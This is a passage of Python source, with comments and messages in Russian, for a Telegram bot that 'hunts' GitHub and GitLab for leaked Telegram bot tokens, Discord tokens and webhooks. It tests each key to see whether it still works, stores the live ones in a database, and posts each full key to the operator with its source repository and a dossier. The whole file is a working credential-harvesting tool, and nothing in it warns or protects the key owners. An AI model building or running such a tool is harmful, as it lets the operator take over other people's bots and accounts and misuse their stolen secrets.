    safe_query = html.escape(str(snap["current_query"]))
    safe_phrase = html.escape(str(snap["phrase"]))
    safe_status = html.escape(str(snap["status_text"]))
    safe_filter = html.escape(FILTER_MODES.get(snap["filter_mode"], snap["filter_mode"]))
    safe_hunt = html.escape(HUNT_MODES.get(snap["hunt_mode"], snap["hunt_mode"]))

    limit_str = "∞" if snap["limit_live"] >= 999 else str(snap["limit_live"])

    text = (
        f"{spinner} <b>Кибер-поиск запущен...</b>\n\n"
        f"⏱ Время: <code>{html.escape(snap['time'])}</code> | "
        f"🔍 Проверено: <code>{snap['checked_tokens']}</code>\n"
        f"🟢 Живых: <code>{snap['found_live_current']} / {limit_str}</code> | "
        f"⚠️ Скам: <code>{snap['scam_tokens']}</code>\n"
        f"🎯 Охота: <code>{safe_hunt}</code> | 🎛 Фильтр: <code>{safe_filter}</code> (пропущено: <code>{snap['skipped_by_filter']}</code>)\n"
        f"📌 Статус: <code>{safe_status}</code>\n\n"
        f"📡 Запрос: <code>{safe_query}</code>\n\n"
        f"📟 <b>Консоль событий ({MAX_LOG_LINES} строк):</b>\n"
        f"<pre>{safe_logs}</pre>\n"
        f"⚙️ <i>{safe_phrase}</i>"
    )

    try:
        bot.edit_message_text(
            chat_id=chat_id,
            message_id=msg_id,
            text=text,
            parse_mode="HTML",
            reply_markup=get_progress_buttons(),
        )
    except Exception:
        pass


def _matches_session_filter(f_type: str, is_scam: bool, filter_mode: str) -> bool:
    if filter_mode == "no_scam":
        return (not is_scam) and (f_type != "Webhook")
    if filter_mode == "tg_only":
        return f_type == "Telegram"
    return True


def process_single_finding(finding: Dict[str, str], chat_id: int) -> None:
    with state_lock:
        if search_state["stop_requested"] or search_state["found_live_current"] >= search_state["limit_live"]:
            return

    f_type = finding.get("type", "")
    token = finding.get("token", "")
    repo = finding.get("repo", "unknown")
    url = finding.get("url", "")

    add_log(f"🔎 Проверяю {f_type} из {repo}...")
    is_live, bot_name, is_scam, dossier, err_reason = check_finding_bounded(
        f_type, token, max_sec=PER_TARGET_MAX_SEC
    )

    with state_lock:
        search_state["checked_tokens"] += 1
        checked_now = search_state["checked_tokens"]
        if not is_live:
            search_state["dead_tokens"] += 1
            suffix = f" ({err_reason})" if err_reason else ""
            add_log(f"❌ #{checked_now} Мёртвый {f_type} [{repo[:24]}]{suffix}")
            return

        if search_state["found_live_current"] >= search_state["limit_live"]:
            return

        cur_filter = search_state["filter_mode"]
        if not _matches_session_filter(f_type, is_scam, cur_filter):
            search_state["skipped_by_filter"] += 1
            add_log(f"⏭️ #{checked_now} Пропущено фильтром [{cur_filter}]: {f_type}")
            return

        search_state["found_live_current"] += 1
        current_found = search_state["found_live_current"]
        current_limit = search_state["limit_live"]
        if is_scam:
            search_state["scam_tokens"] += 1
        if f_type == "Telegram":
            search_state["tg_found"] += 1
        elif f_type == "Discord":
            search_state["dc_found"] += 1
        elif f_type == "Webhook":
            search_state["wh_found"] += 1

    token_info = {
        "type": f_type,
        "token": token,
        "repo": repo,
        "url": url,
        "bot": bot_name or "Unknown",
        "scam": is_scam,
    }
    save_live_token(token_info)
    add_log(f"🟢 #{checked_now} БИНГО! {f_type}: {bot_name}")

    safe_type = html.escape(f_type)
    safe_bot = html.escape(str(bot_name or "Unknown"))
    safe_token = html.escape(token)
    safe_repo = html.escape(repo)
    safe_url = html.escape(url, quote=True)
    scam_badge = "⚠️ СКАМ / ПОДОЗРИТЕЛЬНО" if is_scam else "✅ НОРМ"
    limit_str = "∞" if current_limit >= 999 else str(current_limit)

    card_text = (
        f"🚨 <b>НАЙДЕН {safe_type}!</b> ({current_found}/{limit_str})\n\n"
        f"🤖 Имя / Цель: <b>{safe_bot}</b>\n"
        f"🏷 Статус: {scam_badge}\n"
        f"📦 Репозиторий: <code>{safe_repo}</code>\n"
        f"🔗 <a href='{safe_url}'>Открыть источник</a>\n"
        f"🔑 Ключ: <code>{safe_token}</code>\n\n"
        f"📄 <b>Досье:</b>\n{dossier}"
    )

    try:
        bot.send_message(
            chat_id,
            card_text,
            parse_mode="HTML",
            disable_web_page_preview=True,
        )
    except Exception as exc:
        add_log(f"⚠️ Не удалось отправить карточку в TG: {str(exc)[:35]}")


def _build_final_summary(snap: Dict[str, Any]) -> str:
    status_final = html.escape(str(snap["status_text"]))
    filter_final = html.escape(FILTER_MODES.get(snap["filter_mode"], snap["filter_mode"]))
    hunt_final = html.escape(HUNT_MODES.get(snap["hunt_mode"], snap["hunt_mode"]))
    elapsed_str = html.escape(snap["time"])
    total_db = len(load_live_tokens())

    return (
        f"🏁 <b>Поиск завершён — Сводный отчёт</b>\n\n"
        f"📌 Причина: <code>{status_final}</code>\n"
        f"⏱ Длительность: <code>{elapsed_str}</code>\n"
        f"🎯 Охота: <code>{hunt_final}</code>\n"
        f"🎛 Фильтр сессии: <code>{filter_final}</code>\n\n"
        f"🔍 Всего проверено: <code>{snap['checked_tokens']}</code>\n"
        f"🟢 Принято живых: <code>{snap['found_live_current']}</code>\n"
        f"   ├ Telegram: <code>{snap['tg_found']}</code>\n"
        f"   ├ Discord: <code>{snap['dc_found']}</code>\n"
        f"   └ Webhooks: <code>{snap['wh_found']}</code>\n"
        f"⚠️ Подозрительных / Скам: <code>{snap['scam_tokens']}</code>\n"
        f"❌ Мёртвых: <code>{snap['dead_tokens']}</code>\n"
        f"⏭️ Пропущено фильтром: <code>{snap['skipped_by_filter']}</code>\n\n"
        f"🗂 Всего записей в базе: <code>{total_db}</code>"
    )


def run_search_task(chat_id: int, msg_id: int) -> None:
    try:
        while True:
            with state_lock:
                if search_state["stop_requested"]:
                    search_state["status_text"] = "Остановлено пользователем"
                    break
                if search_state["found_live_current"] >= search_state["limit_live"]:
                    search_state["status_text"] = "Лимит находок достигнут"
                    break
                search_state["status_text"] = "Поиск в репозиториях..."

            raw_findings, code = search_github_dynamic()
            if code == 401:
                break

            with state_lock:
                still_active = (
                    not search_state["stop_requested"]
                    and search_state["found_live_current"] < search_state["limit_live"]
                )

            if still_active and random.random() < 0.35:
                raw_findings.extend(search_gitlab())

            if not raw_findings:
                continue

            set_status(f"Проверка кандидатов ({len(raw_findings)})...")
            for idx, item in enumerate(raw_findings, 1):
                with state_lock:
                    if (
                        search_state["stop_requested"]
                        or search_state["found_live_current"] >= search_state["limit_live"]
                    ):
                        break
                set_status(f"Проверка {idx}/{len(raw_findings)}...")
                process_single_finding(item, chat_id)
                if idx % 2 == 0 or idx == len(raw_findings):
                    update_progress_message(chat_id, msg_id)

            update_progress_message(chat_id, msg_id)

    finally:
        with state_lock:
            search_state["is_searching"] = False
            if search_state["start_time"] is None:
                search_state["start_time"] = time.time()

        snap = get_state_snapshot()
        summary_text = _build_final_summary(snap)

        try:
            bot.edit_message_text(
                chat_id=chat_id,
                message_id=msg_id,
                text=summary_text,
                parse_mode="HTML",
                reply_markup=None,
            )
        except Exception:
            try:
                bot.send_message(chat_id, summary_text, parse_mode="HTML")
            except Exception:
                pass


# =====================================================================
# ЗАПУСК ПОЛЛИНГА БОТА (УСТОЙЧИВОСТЬ К 409 CONFLICT) И FLASK
# =====================================================================
def run_bot_polling() -> None:
    try:
        bot.remove_webhook()
    except Exception:
        pass

    conflict_streak = 0
    while True:
        try:
            bot.infinity_polling(
                timeout=30,
                long_polling_timeout=25,
                skip_pending=True,
                logger_level=None,
            )
            conflict_streak = 0
        except apihelper.ApiTelegramException as api_err:
            err_str = str(api_err)
            if "409" in err_str or "Conflict" in err_str:
                conflict_streak += 1
                wait_time = min(15 * conflict_streak, 120)
                print(
                    f"[BOT] 409 Conflict (другой экземпляр бота уже опрашивает TG). "
                    f"Повтор через {wait_time}с...",
                    flush=True,
                )
                time.sleep(wait_time)
            else:
                print(f"[BOT] Telegram API ошибка: {api_err}. Повтор через 5с...", flush=True)
                time.sleep(5)
        except Exception as exc:
            print(f"[BOT] Неожиданная ошибка polling: {exc}. Повтор через 5с...", flush=True)
            time.sleep(5)


if __name__ == "__main__":
    if SPREADSHEET_ID and (GOOGLE_CREDS_B64 or GOOGLE_CREDS_JSON_RAW):
        threading.Thread(target=get_google_worksheet, daemon=True).start()

    threading.Thread(target=run_bot_polling, daemon=True).start()

    port = int(os.environ.get("PORT", "10000"))
    app.run(host="0.0.0.0", port=port, debug=False, use_reloader=False)
